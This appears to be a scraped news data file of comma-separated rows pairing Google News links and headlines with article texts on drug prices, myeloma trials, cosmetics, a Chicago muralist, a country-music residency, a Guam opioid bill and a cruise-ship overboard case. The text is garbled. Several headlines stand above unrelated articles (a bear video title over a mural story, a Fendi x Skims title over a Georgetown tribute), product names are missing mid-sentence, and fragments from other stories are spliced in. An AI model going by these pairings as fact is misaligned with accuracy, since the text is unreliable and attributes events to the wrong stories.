The program solicits public comments on drug prices. Those show that some Oregonians can’t buy their medications regularly because they need money for food or housing.

“Even with price increases slowing there’s still a big burden on individuals due to drug prices” Griffith told the Capital Chronicle.

Last year companies reported price increases for 71 drugs – 40 generics and 31 branded drugs. A generic made by Nostrum Labs had the highest year-over-year increase: 778%. Griffith did not give details about its price.

The average increases were 27% for generics and 13% for branded drugs.

Since 2015 companies have reported fewer price increases on existing drugs Griffith said. In Oregon there was a huge drop in the number of price reports after 2019 the first year that the program collected the reports. That year drug manufacturers reported increasing prices on 550 drugs. In 2020 they filed 160 reports. The reduced number is not because companies are shielding price rises Griffith said.

“We’re tracking that” she told the Capital Chronicle.

Though analysts don’t know why fewer drugs are seeing price increases Griffith noted that states like Oregon and California have recently adopted public reporting programs. But she said the trend started even before that. She said that companies might be coming out of the gate with high prices to avoid raising them over time.",https://news.google.com/articles/CBMidWh0dHBzOi8vd3d3LmZpZXJjZXBoYXJtYS5jb20vcGhhcm1hL3Nhbm9maS1qb2huc29uLWpvaG5zb24tY29sbGlzaW9uLWNvdXJzZS1zYXJjbGlzYS1kYXJ6YWxleC00LWRydWctbXVsdGlwbGUtbXllbG9tYdIBAA?hl=en-US&gl=US&ceid=US%3Aen,ASH: Sanofi Johnson & Johnson on collision course with Sarclisa Darzalex 4-drug regimens in myeloma,"Sanofi and Johnson & Johnson are adding more fuel to their CD38 rivalry fire between Sarclisa and Darzalex in multiple myeloma. With approvals already in place as triplet therapies the two companies are now touting early clinical wins for four-drug regimens.

In newly diagnosed multiple myeloma patients who are eligible for transplant adding Sanofi’s Sarclisa to a widely used regimen of Bristol Myers Squibb’s Revlimid Takeda’s Velcade and corticosteroid dexamethasone (RVd) helped more patients achieve very low levels of minimal residual disease (MRD) in the blood system after induction therapy.

Although not the trial sponsor Sanofi worked closely with the German-speaking Myeloma Multicenter Group (GMMG) and “there is potential that Sanofi could work on a filing plan with GMMG in the future” Zsuzsanna Devecseri Sanofi’s head of global oncology medical affairs told Fierce Pharma via email. An October presentation shows the French pharma expects to potentially file Sarclisa for approval in newly diagnosed transplant-eligible myeloma based on GMMG in or beyond 2024.

In the study 50.1% of patients treated with the Sarclisa combo achieved MRD negativity while that was the case for 35.6% of RVd patients meaning patients who got Sarclisa were 83% more likely to hit that marker. MRD is a well-established marker to measure the effectiveness of treatment and a fairly good prognostic factor to predict clinical outcomes.

The data came from the GMMG-HD7 trial and marks the first time that a phase 3 study reported a better MRD negativity rate postinduction for a CD38 antibody on top of RVd the investigators noted. The results are presented at the American Society of Hematology's 63rd annual meeting.

But the trial wasn’t all positive. On a secondary endpoint the rates of complete response were similar between the two arms. Devecseri argued that end of induction is typically too early to detect a significant difference on complete response rates as eliminating the myeloma protein takes some time.

On Johnson & Johnson’s part the company has longer-term follow-up for Darzalex’s RVd combo in newly diagnosed transplant-eligible multiple myeloma from the phase 2 Griffin trial. After induction and consolidation treatment the trial now has two years of maintenance therapy data.

At that evaluation point the Darzalex-RVd combo maintained a higher MRD-negativity rate of 64.4% compared with 30.1% for RVd according to data unveiled at ASH 2021. The rates of complete response deepened to 82% for the Darzalex regimen after two years of maintenance compared with 61% for RVd.

Darazlex-RVd also improved the rates of durable clearance. Among MRD-negative patients 44% in the Darzelex-RVd group enjoyed that status for at least one year versus 13% for RVd.

Craig Tendler global head of late clinical development of hematology and oncology at J&J’s Janssen said he wasn’t surprised by Sarclisa’s MRD showing after induction. But it’s really a sustained MRD negativity rate that points to better treatment outcomes for patients he noted in an interview.

In another showing that gives Tendler more confidence in the ongoing phase 3 trial dubbed Perseus of Darzalex in the same setting is a growing pronounced trend toward improved disease progression for the quadruplet therapy. Although not statistically significant for a small-sized phase 2 trial Darzalex-RVd cut the risk of progression or death by 54% over RVd after a median follow-up of 38.6 months.

While this round of data for the CD38-RVd combos are from trials in transplant-eligible population the two CD38 antibodies are also nearing a final showdown in patients who aren’t eligible for transplant.

There Darzalex’s phase 3 Cepheus trial previously bore a primary completion date in April. An independent data monitoring committee conducted a review at that time and recommended the trial to continue following patients with the next analysis planned for 2022 Tendler said.

As for Sarclisa its phase 3 Imroz study for the RVd-Sarclisa pairing was expected to read out this year. But Sanofi recently adjusted the timeline and now plans to have data in the first half of next year.

Darzalex enjoys more than four years of a head start over Sarclisa. The Janssen drug is approved in several combination regimens in different indications including newly diagnosed myeloma. Sarclisa marked Sanofi’s return to oncology with an initial FDA go-ahead last March but it doesn’t yet have a frontline label."

Bobbi Brown shared exactly how to use each shade of her iconic .

“I’m in my mid-60s I don’t know what I would do without this product” she said.

The versatile formula can be used as a skin tint blush and highlighter.

Bobbi Brown’s have disrupted the makeup scene over the last few years. Since their launch Brown has expanded the shade range from four to 12 colors allowing each to serve a specific purpose for different skin tones. In a new video the makeup artist explained exactly how to use Miracle Balm and offered tips for application for every shade.

In general the Miracle Balms are an enhancement a problem solver and a lifter Brown said. “If you’re someone who is of a certain age and you feel like you’ve been not looking your best you’ve been looking tired when you put this on it automatically makes you look better. And usually by the way when you look better you start feeling better.”

Below is Brown’s guide to wearing her hero product—plus how you can layer them to get an angelic natural glow.

Jones Road Miracle Balm skin tints

Tints essentially give the face a healthy wash of color. is “great for women who have fair to medium skin” Brown said. is her personal go-to she added as the deep mauve is ideal for those who have olive-yellow skin tones and want to counteract it. “There’s enough red in it so it just looks like a combination of bronzer tint and blush” she said. “It also looks great on the lips.” she uses all over when she “want[s] to look healthy like I have a tan.” is great for those who have red undertones because it helps “cut the redness” she said. Lastly there’s  which works great on medium to dark skin tones as an all over tint—it can even be used on the lips.

To apply the skin tints Brown suggested using your fingers to blend it into to your cheeks forehead nose and chin.

Jones Road Miracle Balm blushes

If you’d rather not apply the balm all over opt for one of the blush shades. is the “most beautiful pink” that some people also use on their lips Brown explained. “I use it on top of Tawny.” Then there’s  which is more of a peachy coral and the newest blush shade is . “It sits somewhere between Dusty Rose and Flushed” Brown explained. “It’s great for very fair to dark skin tones.”

Jones Road Miracle Balm highlighters

is a cool-toned highlight with silvery hues and is like its “warm sister” Brown said. The latter shade is great for people with dark skin or those who prefer bronze tones she explained. The newest highlighter shade is  a frosty pink. “As a mom of three boys I never got to do the pink thing ... I love sequins I love ballerinas I love tulle. So Happy Hour reminds me of that.” Lastly is colorless for those who don’t like sparkle. Instead it uses its emollient texture to give the high points of the face—cheekbones bridge of the nose forehead cupids bow—a lit-from-within gleam.

Jones Road Miracle Balm application tips

The shades you choose may determine how you apply your balm but Brown cleared the air by saying you can really put it wherever you want. For a natural full-face routine however you can use one from each category—a tint to start a blush on the cheeks and lips and a highlight on cheekbones. If you have oily skin Brown recommended putting your balms of choice over a light veil of loose powder. On the flip side they float effortlessly over and hydrate dry mature skin. “I’m in my mid-60s I don’t know what I would do without this product” she said.",https://news.google.com/articles/CBMiS2h0dHBzOi8vd2VhdGhlci5jb20vc2NpZW5jZS9uYXR1cmUvdmlkZW8vYnJvd24tYmVhci1jaGFyZ2VzLWF0LWNhci1pbi1qYXBhbtIBAA?hl=en-US&gl=US&ceid=US%3Aen,Brown Bear Charges At Car In Japan - Videos from The Weather Channel,"Type at least three characters to start auto complete.

The mural is done by Chicago’s Emmy Star Brown who said it’s the biggest mural she’s painted so far. And she’s painted a lot of murals. She finished this one in December 2022.

“We wanted to create a bright spot for the community that felt joyful and reflective” Brown says.

“I wanted to create a really inspiring impactful piece that served as a visual landmark a statement piece something you can see from the bike path above as well as from Touhy driving by” she says. The mural rises with the pedestrian bridge to 36 feet tall at its highest point.

“It’s a piece that encourages you to pause and take a moment ... to reflect on and hopefully connect with a piece of your younger self.”

The mural is part of a rebirth on the plot at the northwest corner of Touhy and Lincoln avenues — or an “exorcism  ” as Sun-Times reporter David Roeder described it.

When it closed in 2007 and was torn down in 2013 the Purple Hotel had a reputation for drug-fueled parties and was remembered as the site of a mob hit back when it was a Hyatt. The desolate property sat vacant strewn with debris until construction on the mixed-use project known as District 1860 began in 2021. Now apartments are up for lease and restaurants are seating tables. When completed the 8.7-acre project from Tucker Development will include residential units retail and restaurant space and an Amazon Fresh anchor store.

Inspiring connection with one’s inner child is a common theme not just in the Lincolnwood mural but in much of Brown’s recent work. It grew as she taught calligraphy classes in the mid-2010s and realized that she wanted her students to “find their creative imaginative playful selves again.” This realization also led to her to begin painting murals.

“What if I had the opportunity to do a large-scale mural in my calligraphy writing style writing a positive quote?” she wondered. “Something that could really inspire someone or change the course of their day.”

She convinced a gallery in Logan Square to let her paint her mural on the wall for one month. She painted in white script on a black wall: “in a world where you can be anything be kind.”

The mural went viral. Couples traveled to take their wedding photos in front of it. Members of the Red Hot Chili Peppers saw it and asked her to paint her second mural for their shows.

Now Brown said she’s painted dozens of murals with about 13 of them in Fulton Market alone. Her murals and artwork can be found on both interior and exterior walls of coffee shops restaurants and retail stores all over Chicago as well as in private collections. She painted a ceiling mural for a private condo building and licensed her art to a hotel for key cards and other features. She has partnered with brands like Field Notes and Yeti where her patterns grace their book covers and tumbler walls.

Earlier in her career Brown worked primarily in black and white and painted solid glass windows that she found in Chicago dumpsters. Her career exploded after she signed a year-long contract with Sharpie which ran a documentary-style commercial of her on MTV featured her on a billboard in Times Square and showed her in ads in major magazines.

“That changed my life” she says.

Brown grew up in Glen Ellyn and attended college at Illinois Institute for the Arts. Now she works out of Kimball Arts Center in Logan Square where she painted a mural on an outside wall. She’s traveling the world to paint commissioned murals and returned most recently from painting in the British Virgin Islands. She has other murals underway that she can’t talk about yet.

Looking ahead Brown says she hopes to continue with a balance between the murals she loves her licensed work and her studio practice. An exhibition of her work titled “Familiar Form” opened May 3 at Vertical Gallery in Ukranian Village. The exhibit runs to May 25.

“It was a packed house the whole night” Brown says of the opening. Family members collectors who follow the gallery fans who follow her on Instagram and friends from high school college and beyond all showed up.

For a woman who grew up and built her career in and around Chicago “It feels like all my worlds colliding in one place.”

If “Reba Brooks & Dunn: Together in Vegas” residency indeed rides into the sunset after this week’s two shows the artists should be able to look back on their Caesars Palace run knowing they’ve made country music history in Sin City.

Setlist “Play Something Country” “Why Haven’t I Heard From You” Medley: “Little Miss Honky Tonk” / “Take It Back” / “Mama Don’t Get Dressed Up for Nothing” / “Little Rock” / “Put a Girl In It” / “Can’t Even Get the Blues” “Brand New Man”* “Ain’t Nothing ‘Bout You”* “Neon Moon”* “Whoever’s in New England”** “Back to God”** “Going Out Like That”** “The Night the Lights Went Out in Georgia” (Vicki Lawrence cover)** “Hard Workin’ Man” “Red Dirt Road”* “Rock My World” (Little Country Girl)* “Cowgirls Don’t Cry”* “Oklahoma Swing” (Vince Gill cover)** “You’re Gonna Miss Me When I’m Gone” “If You See Him / If You See Her” “The Fear of Being Alone”** “The Greatest Man I Never Knew”** “Is There Life Out There”** “Believe”* “Turn on the Radio”** “I’m a Survivor”** “Boot Scootin’ Boogie”* “My Maria” (B.W. Stevenson cover)* “Fancy”** “Only in America” ** Performed solely by Reba * Performed solely by Brooks and Dunn

The two acts first joined forces at the Colosseum at Caesars Palace in June 2015 which has since become the longest-running country music residency in Las Vegas.

But for fans of Reba McEntire Kix Brooks and Ronnie Dunn as witnessed in their show Tuesday the end might be too soon. Put simply the chemistry they share when performing onstage together is something to be treasured shared seen and enjoyed.

Such was the case at their show Tuesday jam-packed with songs stories and one-liners that kept the full house entertained throughout the night.

Brooks early in the show remarked that he was sure most people were there to see McEntire. “We’re like the cole slaw on the barbecue plate” he deadpanned. “You’re gonna get us too whether you want us or not.”

If that was the case Brooks and Dunn proved to be a pretty good side. The Grammy-winning duo filled the theater with energy with songs such as “Brand New Man” “Neon Moon” and “Rock My World (Little Country Girl).” Later in the show the audience was on its feet for a rollicking rendition of “Boot Scootin’ Boogie” followed by perhaps their biggest hit their cover of “My Maria.”

For her part the 66-year-old “Queen of Country” — spirited and sassy graceful and God-fearing — is at home on the stage.

With the National Finals Rodeo in town McEntire recounted how in 1974 her father had arranged for her to sing the national anthem to open a session of the NFR in Oklahoma City and she was “discovered” by country singer Red Steagall. From there she’s gone on to a nearly 50-year singing and acting career. After telling the story Tuesday she launched into a touching tribute to her father “Greatest Man I Ever Knew.”

Of course the night also included her standards including “Night the Lights Went Out in Georgia” “I’m a Survivor” the theme from her “Reba” television show and “Fancy.”



The three headliners performing together though provided the full-course dinner plate. Among the highlights was a fast-paced medley of songs “Little Miss Honky Tonk” “Take It Back” “Mama Don’t Get Dressed Up for Nothing” “Little Rock” “Put a Girl in It” and “Can’t Even Get the Blues.”

Toward the show’s end the three sat on stools at the front of the stage to share stories and songs. Brooks offered that all songs can be placed in one of two categories: songs that matter and zippity do-dah songs. Lamenting that he usually sang the zippity do-dah variety he joined Reba in a duet of a song that mattered “You’re Gonna Miss Me When You’re Gone.”

With the final two shows of the residency on Tuesday and Wednesday nights there’s a lot of truth in the title.",https://news.google.com/articles/CBMilAFodHRwczovL3d3dy53ZHJiLmNvbS9uZXdzL3N1bGxpdmFuLXVuaXZlcnNpdHktY2hlZi1wdXRzLWhpcy1zZXJ2aWNlLXRvLXRoZS10ZXN0LW9uLW5ldy1kaXNuZXktc2hvdy9hcnRpY2xlX2Y4ODhjZTBjLTViNWEtMTFlYy04ZDQ3LTA3ODA3YThlYWJjYy5odG1s0gEA?hl=en-US&gl=US&ceid=US%3Aen,Sullivan University Chef puts his service to the test on new Disney+ show,Sullivan University Chef puts his service to the test on new Disney+ show,https://news.google.com/articles/CBMiYGh0dHBzOi8vd3d3LnRoZS1zdW4uY29tL2VudGVydGFpbm1lbnQvNDI0NTI0Ny9mZW5kaS14LXNraW1zLXdoYXQtdGltZS1raW0ta2FyZGFzaGlhbi1maW5hbC1kcm9wL9IBZGh0dHBzOi8vd3d3LnRoZS1zdW4uY29tL2VudGVydGFpbm1lbnQvNDI0NTI0Ny9mZW5kaS14LXNraW1zLXdoYXQtdGltZS1raW0ta2FyZGFzaGlhbi1maW5hbC1kcm9wL2FtcC8?hl=en-US&gl=US&ceid=US%3Aen,Fendi x Skims: When was the final drop?...,"COLLECTION Fendi x Skims: When was the final drop?

Prior to Saturday's men's basketball game between the Georgetown Hoyas and Syracuse Orange at Capital One Arena in Washington D.C. Georgetown honored late former head coach John Thompson Jr.

In memory of Thompson Georgetown changed the name of the court at Capital One Arena to John Thompson Jr. Court:

Thompson who died last year at the age of 78 was Georgetown's head coach for 27 seasons from 1972-99.

Thompson is a member of both the Naismith Memorial Basketball Hall of Fame and College Basketball Hall of Fame.

Under Thompson's leadership the Hoyas went 596-239 and reached the NCAA tournament 20 times.

Georgetown made it to the national championship game three times in a four-year stretch from 1982-85 winning the national title in 1984.

Fittingly the star player from that team New York Knicks legend Patrick Ewing was on hand for Saturday's game as he has been Georgetown's head coach since the 2017-18 season.",https://news.google.com/articles/CBMiN2h0dHBzOi8vdGhlcG9pbnRzZ3V5LmNvbS9ndWlkZS9zb2xvLW5ldy15ZWFycy1ldmUtdHJpcC_SAQA?hl=en-US&gl=US&ceid=US%3Aen,I took a solo trip on New Year’s Eve – here’s why you should too,"New Year's Eve used to be my least favorite holiday of the year because it's the hardest to celebrate while single.

Many people assume that it would be Valentine's Day with its over-the-top displays of affection and rose vendors on every street corner. But there are enough people who are actively anti-Valentine's Day and that they have groups promoting the same. They get together with friends purge pictures of exes and watch funny movies together.

There is no ""anti-New Year's Eve"" celebration. There's just sitting at home eating ice cream while watching the ball drop if not sleeping through it altogether.

But this wasn't just another New Year's Eve. I was about to turn 29. It was the beginning of the end of my 20s and I'd spent way too much time waiting for someone else to walk into my life and make it worth celebrating. Instead of going to a party alone and drinking too much or cancelling my trip and wallowing at home with my fake friends Ben & Jerry I decided to remove myself from the situation.

I embraced a third lesser utilized option and escaped from New Year's Eve altogether by booking a solo trip to Athens Greece that would put me in the air at midnight. I may have been alone but I wasn't going to sit around and cry about it. I wanted to be so excited about where I was heading that I wouldn't look back with remorse over what might have been.

I was in a window seat as midnight approached and got nervous. Would the person next to me come in for a kiss or get handsy? I had no way to dodge them unless I karate chopped them in the throat leapt over the seatback trays and jumped out into the aisle. That seemed a little more agile than I was prepared to pull off. I looked at the time on my airplane-mode phone squeezed a blanket tightly around my shoulders and braced myself.

Then something magical happened. Midnight came and went and no one moved. It was like we were in a vortex where time didn't exist probably because everyone was coming from different time zones. The cabin lights were dimmed. Some people were sleeping while others were watching a movie. No one seemed to care or even know that it was midnight.

Just like that my fear of New Year's Eve vanished -- not with a bang but with a whimper. An airplane hum if you will.

That year I celebrated the beginning of a new chapter while sipping Champagne somewhere over the Atlantic Ocean.

While an unconventional way to celebrate flying on New Year's Eve has its perks including lower ticket prices since most people want to be at their destination come midnight instead of in the air.

Here are four reasons you should consider planning your own holiday escape.

Embrace the freedom to travel

(Photo by © Marco Bottigelli/Getty Images)

Are you feeling lonely? Reframe your mindset. Your position is not sad it's enviable. After all you're free! You're able to make solo travel plans without having to confirm dates budget or availability with anyone else. You can abandon your home for a week and return to find everything just as you left it.

You are primed to have the time of your life and the sooner you start seeing it that way the sooner you'll be able to celebrate the way you deserve.

Accomplish empowering feats

Nothing makes you feel more renewed than traveling solo. It snaps you out of your daily rut and bombards you with new sights sound smells and interactions. People feeling lost will find perspective abroad and those scared of their own power can begin to fully explore it.

The act of safely transporting yourself around the globe can be therapeutic for those grieving a break-up contemplating a career change or seeking refuge from the world of social media and endless comparison. You can't run away from your problems but you can start to see them as smaller from a distance.

Socialize without constraints

When you travel with a companion you have a safety blanket of sorts. They communicate in your language are there for every meal and can step in and help if something goes wrong. When you travel by yourself you have no choice but to interact with locals and people you meet along the way. The invites and assistance you receive will surprise you.

You may be scared of traveling solo during the holidays because it's a time traditionally spent with family. With so many opportunities to engage with others however you'll find the world is full of people who are waiting to get to know you.

Set the tone for a good year

There's something to be said for starting the year on a good note and after the last two years we're desperately in need of a change of pace. Traveling helps you celebrate with a fresh perspective and grateful outlook. It sets the tone for the year to come which will hopefully be filled with more trips and a return to exploration across the globe.",https://news.google.com/articles/CBMiaGh0dHBzOi8vd3d3LnRoZXN1bi5jby51ay90dmFuZHNob3diaXovY2VsZWJyaXRpZXMvMTcwMTIzODEvaGFycnktc3R5bGVzLWtoYWxpZC1taWFtaS1jb25jZXJ0LWJlYWNoLWJhc2gv0gFsaHR0cHM6Ly93d3cudGhlc3VuLmNvLnVrL3R2YW5kc2hvd2Jpei9jZWxlYnJpdGllcy8xNzAxMjM4MS9oYXJyeS1zdHlsZXMta2hhbGlkLW1pYW1pLWNvbmNlcnQtYmVhY2gtYmFzaC9hbXAv?hl=en-US&gl=US&ceid=US%3Aen,Where to get tickets for Harry Styles Miami Beach Bash?...,"HARRY TAKES MIAMI Where to get tickets for Harry Styles Miami Beach Bash?

The cardinal also expressed his gratitude for the rector and staff at St. Mary’s Oratory-Wausau where he spent three months in rehabilitation following his hospitalization.

“May God abundantly reward all who have assisted me and continue to assist me so that I may fully return to the active service of our Lord and of his mystical body the Church” the cardinal said.

Burke celebrated the Traditional Latin Mass at the Shrine of Our Lady of Guadalupe in La Crosse Wisconsin. In a message ahead of the Mass the cardinal said his health has improved but the Mass would not signal a return to his usual pastoral activities and his rehabilitation will continue for the foreseeable future.

But he did speak briefly in his Dec. 11 homily about a renewed vigor to serve the Church through the Shrine of Our Lady of Guadalupe.

“I want to help pilgrims to the shrine to have the fullest encounter possible with our Lord— an encounter which will sustain them as they return to their homes work and other activities” Burke said. “In a special way I will dedicate myself to the realization of the retreat house to be built alongside the church so that pilgrims may regularly spend several days with our Lord here especially at the most important or critical times in their lives.”",https://news.google.com/articles/CBMigwFodHRwczovL3d3dy5wb3N0Z3VhbS5jb20vbmV3cy9sb2NhbC90cnVzdC1mdW5kLWJpbGwtZm9yLW9waW9pZC1zZXR0bGVtZW50LWRlYmF0ZWQvYXJ0aWNsZV9lNjc0OWVmMi01NzIzLTExZWMtYmNlOC0xNzQwNDU1MWU4MGQuaHRtbNIBAA?hl=en-US&gl=US&ceid=US%3Aen,Trust fund bill for opioid settlement debated | Guam News | postguam.com,"As legislative session proceeded this week senators discussed Bill 204-36 a measure that would create a trust fund for opioid settlement awards and establish an advisory council to direct the use of these funds.

""According to the Department of Health and Human Services last year 70000 people died from opioid overdose and 1.6 million had an opioid use disorder in the United States. A total of 843000 drug overdose deaths have occurred since 1999 two-thirds of which were due to opioids"" Sen. Amanda Shelton the bill's main sponsor said Tuesday.

""These worrying statistics spell a need for this measure. It's my intention that the settlement funds will be able to deliver help to those in need"" she said.

Also known as Opioid Prevention and Treatment Act Shelton said Bill 204 proposes four things:

Create a trust fund to receive moneys obtained through opioid litigation.

Dedicate funds for facilitating and expanding treatment efforts in line with relevant court judgments orders and agreements.

Establish an Opioid Recovery Advisory Council to set a spending strategy.

Designate the Office of the Attorney General as the single agency to bring claims regarding opioids against entities.

The bill is part of ensuring compliance with settlement agreements and judgments arising from multi-state lawsuits brought against opioid manufacturers firms and distributors who profited from the opioid epidemic.

In July the attorney general announced Guam could receive about $10 million to be paid out over 18 years as part of a $26 billion proposed national opioid settlement with Johnson & Johnson and three of the largest pharmaceutical distributors in the country. They are Cardinal Health McKesson and AmerisourceBergen.

But sometime after that the OAG stated it was now expecting settlement funds closer to $14 million for Guam. However the discussion Tuesday focused around the initial $10 million expectation.

The funds are expected to arrive in mid-2022.

A smaller settlement was announced in February when the OAG stated that Guam would receive $280000 from a $573 million multi-state settlement with McKinsey & Company one of the largest consulting firms for Purdue Pharma and other opioid-involved companies.

The OAG later released a breakdown of how that funding would be used which included earmarking $60000 for toxicology testing to gather more data on the prevalence of opioids and other illicit drugs.

Assistant Attorney General Shannon Taitano said Tuesday that the government also entered into service agreements with providers to integrate clients back into regular life on Guam by helping them get a driver's license or even help pay outstanding utility bills to get placement in housing for example.

""We're just trying to do things like that in improving the lives of these individuals so that they can successfully recover from substance abuse and hopefully with that maybe curtail the amount of crime that can result from someone addicted or high on drugs"" Taitano said.

In the few days prior the Legislature also discussed legislation intended to improve sole source procurement on Guam and a measure that would lift the local ban on gun silencers and suppressors as well as several resolutions.",https://news.google.com/articles/CBMibmh0dHBzOi8vd3d3Lmlwc3dpY2hzdGFyLmNvLnVrL25ld3MvaGVhbHRoLzIxODkxNDQ0Lm9ubGluZS1jYXJkaW5hbC1tZWRpY2FsLXByYWN0aWNlLWdwLWJvb2tpbmctc3lzdGVtLXByYWlzZWQv0gEA?hl=en-US&gl=US&ceid=US%3Aen,Online Cardinal Medical Practice GP booking system 'praised',"Patients were having difficulties getting through to Norwich Road Chesterfield Road and Deben Road GPs after the merger into Cardinal Medical Practice in the summer but the situation seems to have improved.

Andy Yacoub chief executive of Healthwatch Suffolk said the GP surgery with around 30000 patients is seeing ""praise"" for its online systems' ""ease and effectiveness"".

He added: “What’s needed next is a proactive encouragement to use these available digital services while also making it clear that although this is the preferred method of communication this is not the only one – and any individuals who may struggle or be intimidated by using it can still call in.”

He added that lots of GPs in Suffolk are getting criticised due to issues like ""decreasing access and responsiveness"" as pressure on their services increase in ""remarkably trying circumstances"".

Christine Shaw an Ipswich borough councillor for the Whitton Ward who is also a patient at the practice said the situation has ""completely"" changed at the surgery where patients are having similar routine issues to other GPs.

Ms Shaw: ""I think the situation is a lot better than other GPs in Ipswich.""

Maria Manning another patient said: ""I have been quite poorly over the last three weeks. I have been using the Ask GP service and it's been absolutely fabulous.

""Doctors have been great and forwarding prescriptions onto chemist. No complaints from me.""

Some people who have been places 50 or 37 in the phone queue still have issue getting through to the surgery but it's hoped that more people take up the online service.

A spokesman for Cardinal Medical Practice said: “Over the last few months we have successfully recruited new staff. We have also introduced the AskMyGP service enabling patients to contact us and access services more easily which we know has been well received.

“Like all other GP practices we still face many challenges during this incredibly busy time but it’s certainly pleasing to hear positive feedback on the work we’re doing.

“We thank our patients for their continued support and our staff for all that they do.”",,,,,,

Petty Officer First Class Adam Stanton said Sunday that the woman who is believed to be in her 20s went overboard early Saturday morning The Associated Press reports.

The USCG Southern California announced Saturday afternoon on Twitter that members from the USCGC Forrest Rednour and a Sector San Diego MH-60 Jayhawk helicopter crew were working with the Mexican Navy to locate the woman.

The victim is believed to have fallen overboard near Ensenada Mexico.

PEOPLE has reached out to the USCG Southern California and Carnival Cruise Lines for comment.

On Sunday afternoon the Coast Guard announced on Twitter that its assets were ""standing down pending additional information"" after ""first light searches"" conducted off the coast of Ensenada Mexico that morning delivered negative results. USCG assets have since traveled back to U.S. waters.

Carnival Cruise Lines said in a statement to NBC News that the ship was released after assisting with the search before continuing on.

""Our thoughts are with the guest and her family and our Care Team is providing support"" the cruise line said.

One Carnival Miracle passenger Josh Zufelt told NBC News that travelers were informed of the incident shortly after it occurred. He recalled the ship coming to a near standstill at about 3:30 a.m. local time and a lifeboat was dropped into the ocean per the outlet.

Daniel Miranda another passenger on the cruise told KABC that he too woke up around 3 a.m. Saturday morning when a general announcement was played across the ship warning ""Man overboard!""

Miranda also alleges that portions of the ship were ""cornered off for their search.""

After the ship arrived in Ensenada Miranda told CBS Los Angeles that he attempted to help look for the missing woman. ""They immediately did their best efforts to get crews out on little boats and rescue to start a search"" he said.

""They had crew literally around the deck to look all the way around the ship to be able to see if somebody was out in the water"" Miranda added. ""They had lights out in the water trying to flash out there but again it's pretty dark.""",https://news.google.com/articles/CBMibGh0dHBzOi8vbnlwb3N0LmNvbS8yMDIxLzEyLzEyL3Bhc3NlbmdlcnMtc3VzcGVjdC1mb3VsLXBsYXktYWZ0ZXItd29tYW4tZmFsbHMtb3ZlcmJvYXJkLWNhcm5pdmFsLWNydWlzZS1zaGlwL9IBAA?hl=en-US&gl=US&ceid=US%3Aen,Passengers suspect 'foul play' after woman falls off Carnival cruise ship,"At around 3:30 a.m. Saturday passengers on the Carnival Miracle cruise ship were awakened by an alert that someone had fallen overboard.

Passengers were in the midst of a three-day California voyage from the Long Beach Cruise Terminal to Ensenada.

“Someone has lost their life whether it was done by accident or by foul play I don’t know” said Daniel Miranda a Northern California firefighter paramedic on board the ship according to CBS Los Angeles.

“There’s some high suspicion of foul play.”

The outlet states that many passengers are also concerned the incident occurred from foul play after the woman fell from the fifth-floor balcony of her stateroom.

There are 12 decks on the Carnival Miracle cruise ship.

“A lot of people are concerned because that’s somebody’s life and that’s a high likelihood that this person will not be found alive” Miranda added.

“They did their best efforts to get crews out on little boats and rescue and start a search” said Miranda.

Following the incident on Saturday morning Carnival issued a statement.

“We advised Carnival Miracle guests this morning of an overboard incident involving one of our guests from the balcony of her stateroom” they wrote.

“Our thoughts are with the guest and her family and our care team is providing support.”

With a guest capacity of 2100 people Miranda estimated around 1100 were on board the cruise ship at the time of the incident.

The Carnival Miracle was sailing around 35 miles west of the coast of Ensenada Mexico when the passenger went over the rails shortly after 3 a.m. The incident was captured on security footage the U.S. Coast Guard said.

The Carnival cruise ship came to a near complete stop around 3:30 a.m. as crew members dropped a lifeboat into the water according to a passenger’s account on a NBC news station.

The cruise ship subsequently searched in the water as shown on the AIS image below.

Some news acounts state that the woman went over the rails of her stateroom although the video below via a local CBS station suggests that the passenger went overboard from from an open deck of the ship.

Accrding to Newsweek a firefighter paramedic onboard the cruise ship told CBS Los Angeles: “Someone has lost their life whether it was done by accident or by foul play I don’t know – there’s some high suspicion of foul play.”

The U.S. Coast Guard dispatched a cutter and a helicopter to the area to search for the woman. The search was unsuccessful.

The incident raises an ongoing issue with cruise ships which are required by the 2010 Cruise Vessel Secuity and safety Act to install automatic man over-board sytems. Technology has long existed for ships to detect whenever someone goes over the rails of the ship and into the water. If installed sophistcated infrared monitors and radar sustems can automatically signal the bridge capture the image and track the person even at night in the water. Such systems assist in the immediate detection of overboards and tracking them in the water at night; otherwise searching for a person in the water is akin to looking for a needle in a haystack.

Well over 300 people have gone overboard from cruise ships in the last twenty years according to cruise expert Dr. Ross Klein which has tracked cruise ship overboard for many years. Most cruise lines with the exception of Disney Cruises refuse to install the life-saving technology.

In this particular case it appears that there was not the usual delay in deteching the overboard passenger’s disappearance from the ship which was confirmed by what the U.S. Coast Guard described as a “security camera.” Although most Carnival cruise ships do not have man=overboard systems installed it is unknown whether the Carnival Miracle has such systems on the ship.

The report which combines ACT’s proprietary data analysis from a wide variety of industry sources paints a comprehensive picture of trends impacting transportation and commercial vehicle markets.

Regarding industry constraints Kenny Vieth ACT’s president and senior analyst said “While the focus is on silicon and semiconductors it is really an ‘everything’ shortage. Those constraints are not localized CV industry-specific challenges but continue as pandemic-driven failures in a globally reliant web of interrelated supply chains. Rebuilding complex global networks requires the system to spin at roughly the same speed which it is decidedly not doing at present.

“Just like heightened inflation the current situation in North American commercial vehicle manufacturing is transient: The issues impacting production will pass. Of course while transient implies a return to a normalized demand-driven state of activity the word does not imply either magnitude or duration” Vieth added. “Were this a traditional cycle soaring market indicators and already massive backlogs would put us in the easiest part of the cycle to forecast as carrier profitability is at the heart of the vehicle demand equation.”

